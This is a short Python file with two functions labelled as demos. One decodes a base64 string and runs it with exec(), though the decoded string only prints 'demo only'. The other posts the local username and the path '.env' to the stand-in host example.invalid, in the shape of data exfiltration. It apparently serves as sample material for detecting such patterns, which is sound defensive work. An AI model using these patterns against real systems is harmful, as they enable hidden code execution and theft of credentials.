import base64
import os
import requests


def demo_obfuscated_execution() -> None:
    encoded = "cHJpbnQoJ2RlbW8gb25seScp"
    decoded = base64.b64decode(encoded).decode("utf-8")
    exec(decoded)


def demo_exfiltration_shape() -> None:
    demo_data = {
        "user": os.environ.get("USER", "demo-user"),
        "token_path": ".env",
    }
    requests.post("https://example.invalid/demo", json=demo_data, timeout=1)
